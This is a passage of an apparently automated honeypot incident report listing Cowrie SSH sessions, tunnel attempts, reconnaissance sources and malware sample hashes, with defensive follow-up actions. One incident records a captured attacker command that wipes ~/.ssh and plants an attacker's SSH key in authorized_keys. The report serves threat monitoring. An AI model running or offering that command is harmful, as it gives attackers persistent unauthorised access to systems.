- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-136ea25035f6

| Field | Detail |
|---|---|
| **Source IP** | `218.202.91[.]147` |
| **First Seen** | 2026-07-22 20:28 |
| **Last Seen** | 2026-07-22 20:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:28:25` | `cowrie.session.connect` |
| `2026-07-22 20:28:26` | `cowrie.client.version` |
| `2026-07-22 20:28:26` | `cowrie.client.kex` |
| `2026-07-22 20:28:28` | `cowrie.login.success` |
| `2026-07-22 20:28:29` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:28:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.202.91[.]147` to AbuseIPDB if not already reported
- [ ] Block `218.202.91[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0cf8ad3414b

| Field | Detail |
|---|---|
| **Source IP** | `219.153.106[.]29` |
| **First Seen** | 2026-07-22 20:31 |
| **Last Seen** | 2026-07-22 20:36 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:31:15` | `cowrie.session.connect` |
| `2026-07-22 20:31:16` | `cowrie.client.version` |
| `2026-07-22 20:31:16` | `cowrie.client.kex` |
| `2026-07-22 20:31:17` | `cowrie.login.success` |
| `2026-07-22 20:36:17` | `cowrie.session.file_upload` |
| `2026-07-22 20:36:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.153.106[.]29` to AbuseIPDB if not already reported
- [ ] Block `219.153.106[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66900fb1047c

| Field | Detail |
|---|---|
| **Source IP** | `60.223.251[.]132` |
| **First Seen** | 2026-07-22 20:40 |
| **Last Seen** | 2026-07-22 20:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:40:27` | `cowrie.session.connect` |
| `2026-07-22 20:40:27` | `cowrie.client.version` |
| `2026-07-22 20:40:27` | `cowrie.client.kex` |
| `2026-07-22 20:40:29` | `cowrie.login.success` |
| `2026-07-22 20:40:30` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.223.251[.]132` to AbuseIPDB if not already reported
- [ ] Block `60.223.251[.]132` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2131265a0fcc

| Field | Detail |
|---|---|
| **Source IP** | `185.112.148[.]66` |
| **First Seen** | 2026-07-22 20:40 |
| **Last Seen** | 2026-07-22 20:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:40:36` | `cowrie.session.connect` |
| `2026-07-22 20:40:36` | `cowrie.client.version` |
| `2026-07-22 20:40:36` | `cowrie.client.kex` |
| `2026-07-22 20:40:38` | `cowrie.login.success` |
| `2026-07-22 20:40:38` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:40:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.148[.]66` to AbuseIPDB if not already reported
- [ ] Block `185.112.148[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a5306413fa3

| Field | Detail |
|---|---|
| **Source IP** | `128.185.12[.]179` |
| **First Seen** | 2026-07-22 20:40 |
| **Last Seen** | 2026-07-22 20:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:40:51` | `cowrie.session.connect` |
| `2026-07-22 20:40:52` | `cowrie.client.version` |
| `2026-07-22 20:40:52` | `cowrie.client.kex` |
| `2026-07-22 20:40:54` | `cowrie.login.success` |
| `2026-07-22 20:40:55` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:41:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.185.12[.]179` to AbuseIPDB if not already reported
- [ ] Block `128.185.12[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0ef441110d1

| Field | Detail |
|---|---|
| **Source IP** | `111.53.131[.]79` |
| **First Seen** | 2026-07-22 20:41 |
| **Last Seen** | 2026-07-22 20:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:41:05` | `cowrie.session.connect` |
| `2026-07-22 20:41:05` | `cowrie.client.version` |
| `2026-07-22 20:41:05` | `cowrie.client.kex` |
| `2026-07-22 20:41:08` | `cowrie.login.success` |
| `2026-07-22 20:41:08` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:41:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.53.131[.]79` to AbuseIPDB if not already reported
- [ ] Block `111.53.131[.]79` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9efd404f513c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-22 20:42 |
| **Last Seen** | 2026-07-22 20:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:42:52` | `cowrie.session.connect` |
| `2026-07-22 20:42:52` | `cowrie.client.version` |
| `2026-07-22 20:42:52` | `cowrie.client.kex` |
| `2026-07-22 20:42:53` | `cowrie.login.success` |
| `2026-07-22 20:42:53` | `cowrie.session.params` |
| `2026-07-22 20:42:53` | `cowrie.command.input` |
| `2026-07-22 20:42:53` | `cowrie.log.closed` |
| `2026-07-22 20:42:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-183a074fb4f0

| Field | Detail |
|---|---|
| **Source IP** | `101.13.1[.]58` |
| **First Seen** | 2026-07-22 20:43 |
| **Last Seen** | 2026-07-22 20:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:43:50` | `cowrie.session.connect` |
| `2026-07-22 20:43:51` | `cowrie.client.version` |
| `2026-07-22 20:43:51` | `cowrie.client.kex` |
| `2026-07-22 20:43:53` | `cowrie.login.success` |
| `2026-07-22 20:43:54` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:43:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.1[.]58` to AbuseIPDB if not already reported
- [ ] Block `101.13.1[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae6fb1ac39f7

| Field | Detail |
|---|---|
| **Source IP** | `70.91.135[.]181` |
| **First Seen** | 2026-07-22 20:43 |
| **Last Seen** | 2026-07-22 20:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:43:57` | `cowrie.session.connect` |
| `2026-07-22 20:43:57` | `cowrie.client.version` |
| `2026-07-22 20:43:57` | `cowrie.client.kex` |
| `2026-07-22 20:44:00` | `cowrie.login.success` |
| `2026-07-22 20:44:00` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:44:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.91.135[.]181` to AbuseIPDB if not already reported
- [ ] Block `70.91.135[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39d5d35d0177

| Field | Detail |
|---|---|
| **Source IP** | `46.210.94[.]61` |
| **First Seen** | 2026-07-22 20:44 |
| **Last Seen** | 2026-07-22 20:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:44:10` | `cowrie.session.connect` |
| `2026-07-22 20:44:10` | `cowrie.client.version` |
| `2026-07-22 20:44:10` | `cowrie.client.kex` |
| `2026-07-22 20:44:12` | `cowrie.login.success` |
| `2026-07-22 20:44:12` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:44:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.210.94[.]61` to AbuseIPDB if not already reported
- [ ] Block `46.210.94[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40d57c0c85e5

| Field | Detail |
|---|---|
| **Source IP** | `211.247.127[.]250` |
| **First Seen** | 2026-07-22 20:45 |
| **Last Seen** | 2026-07-22 20:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:45:31` | `cowrie.session.connect` |
| `2026-07-22 20:45:31` | `cowrie.client.version` |
| `2026-07-22 20:45:31` | `cowrie.client.kex` |
| `2026-07-22 20:45:34` | `cowrie.login.success` |
| `2026-07-22 20:45:34` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:45:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.247.127[.]250` to AbuseIPDB if not already reported
- [ ] Block `211.247.127[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d96dc0d1288

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-22 20:45 |
| **Last Seen** | 2026-07-22 20:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:45:39` | `cowrie.session.connect` |
| `2026-07-22 20:45:39` | `cowrie.client.version` |
| `2026-07-22 20:45:39` | `cowrie.client.kex` |
| `2026-07-22 20:45:40` | `cowrie.login.success` |
| `2026-07-22 20:45:40` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:45:40` | `cowrie.direct-tcpip.data` |
| `2026-07-22 20:45:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30eb170f7515

| Field | Detail |
|---|---|
| **Source IP** | `119.152.102[.]54` |
| **First Seen** | 2026-07-22 20:48 |
| **Last Seen** | 2026-07-22 20:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:48:43` | `cowrie.session.connect` |
| `2026-07-22 20:48:43` | `cowrie.client.version` |
| `2026-07-22 20:48:43` | `cowrie.client.kex` |
| `2026-07-22 20:48:45` | `cowrie.login.success` |
| `2026-07-22 20:48:45` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:48:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.152.102[.]54` to AbuseIPDB if not already reported
- [ ] Block `119.152.102[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-727602bbe5fd

| Field | Detail |
|---|---|
| **Source IP** | `167.86.114[.]220` |
| **First Seen** | 2026-07-22 20:49 |
| **Last Seen** | 2026-07-22 20:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:49:08` | `cowrie.session.connect` |
| `2026-07-22 20:49:08` | `cowrie.client.version` |
| `2026-07-22 20:49:08` | `cowrie.client.kex` |
| `2026-07-22 20:49:09` | `cowrie.login.success` |
| `2026-07-22 20:49:10` | `cowrie.session.params` |
| `2026-07-22 20:49:10` | `cowrie.command.input` |
| `2026-07-22 20:49:10` | `cowrie.command.failed` |
| `2026-07-22 20:49:10` | `cowrie.log.closed` |
| `2026-07-22 20:49:11` | `cowrie.session.params` |
| `2026-07-22 20:49:11` | `cowrie.command.input` |
| `2026-07-22 20:49:11` | `cowrie.session.file_download` |
| `2026-07-22 20:49:11` | `cowrie.log.closed` |
| `2026-07-22 20:49:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.86.114[.]220` to AbuseIPDB if not already reported
- [ ] Block `167.86.114[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1caebceb57a1

| Field | Detail |
|---|---|
| **Source IP** | `167.86.114[.]220` |
| **First Seen** | 2026-07-22 20:49 |
| **Last Seen** | 2026-07-22 20:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:49:11` | `cowrie.session.connect` |
| `2026-07-22 20:49:11` | `cowrie.client.version` |
| `2026-07-22 20:49:11` | `cowrie.client.kex` |
| `2026-07-22 20:49:12` | `cowrie.login.success` |
| `2026-07-22 20:49:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.86.114[.]220` to AbuseIPDB if not already reported
- [ ] Block `167.86.114[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7707fb2a6c4

| Field | Detail |
|---|---|
| **Source IP** | `167.86.114[.]220` |
| **First Seen** | 2026-07-22 20:49 |
| **Last Seen** | 2026-07-22 20:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:49:12` | `cowrie.session.connect` |
| `2026-07-22 20:49:12` | `cowrie.client.version` |
| `2026-07-22 20:49:12` | `cowrie.client.kex` |
| `2026-07-22 20:49:12` | `cowrie.login.success` |
| `2026-07-22 20:49:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.86.114[.]220` to AbuseIPDB if not already reported
- [ ] Block `167.86.114[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07a49163bb7f

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-22 20:50 |
| **Last Seen** | 2026-07-22 20:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:50:16` | `cowrie.session.connect` |
| `2026-07-22 20:50:16` | `cowrie.client.version` |
| `2026-07-22 20:50:16` | `cowrie.client.kex` |
| `2026-07-22 20:50:16` | `cowrie.login.success` |
| `2026-07-22 20:50:17` | `cowrie.session.params` |
| `2026-07-22 20:50:17` | `cowrie.command.input` |
| `2026-07-22 20:50:17` | `cowrie.log.closed` |
| `2026-07-22 20:50:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-311b3b9564de

| Field | Detail |
|---|---|
| **Source IP** | `218.21.243[.]58` |
| **First Seen** | 2026-07-22 20:52 |
| **Last Seen** | 2026-07-22 20:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:52:45` | `cowrie.session.connect` |
| `2026-07-22 20:52:46` | `cowrie.client.version` |
| `2026-07-22 20:52:46` | `cowrie.client.kex` |
| `2026-07-22 20:52:47` | `cowrie.login.success` |
| `2026-07-22 20:52:48` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:52:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.21.243[.]58` to AbuseIPDB if not already reported
- [ ] Block `218.21.243[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **5** | 2026-07-22 19:15 | 2026-07-22 20:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]190` | **3** | 2026-07-22 18:56 | 2026-07-22 18:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]176` | **3** | 2026-07-22 18:57 | 2026-07-22 18:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]107` | **3** | 2026-07-22 18:55 | 2026-07-22 18:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `43.226.44[.]28` | **2** | 2026-07-22 19:02 | 2026-07-22 19:04 | 2m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]11` | 1 | 2026-07-22 19:29 | 2026-07-22 19:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `117.175.140[.]121` | 1 | 2026-07-22 20:37 | 2026-07-22 20:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.57.41[.]128` | 1 | 2026-07-22 20:29 | 2026-07-22 20:30 | 13s | 0 | `T1592` | 🟢 LOW |
| `120.52.92[.]136` | 1 | 2026-07-22 19:45 | 2026-07-22 19:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.107.80[.]93` | 1 | 2026-07-22 20:37 | 2026-07-22 20:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.195.210[.]47` | 1 | 2026-07-22 20:06 | 2026-07-22 20:06 | 1s | 0 | `T1592` | 🟢 LOW |
| `219.153.106[.]29` | 1 | 2026-07-22 20:16 | 2026-07-22 20:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `221.228.10[.]226` | 1 | 2026-07-22 20:12 | 2026-07-22 20:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-07-22 20:09 | 2026-07-22 20:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-07-22 19:10 | 2026-07-22 19:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]129` | 1 | 2026-07-22 20:37 | 2026-07-22 20:37 | 5s | 0 | `T1592` | 🟢 LOW |
| `49.229.157[.]48` | 1 | 2026-07-22 19:06 | 2026-07-22 19:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-22 19:00 | 2026-07-22 19:02 | 73s | 0 | `T1592` | 🟢 LOW |
| `61.184.128[.]210` | 1 | 2026-07-22 19:27 | 2026-07-22 19:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-07-22 20:49 | 2026-07-22 20:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `79.136.8[.]69` | 1 | 2026-07-22 20:52 | 2026-07-22 20:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `90.230.226[.]175` | 1 | 2026-07-22 19:02 | 2026-07-22 19:04 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
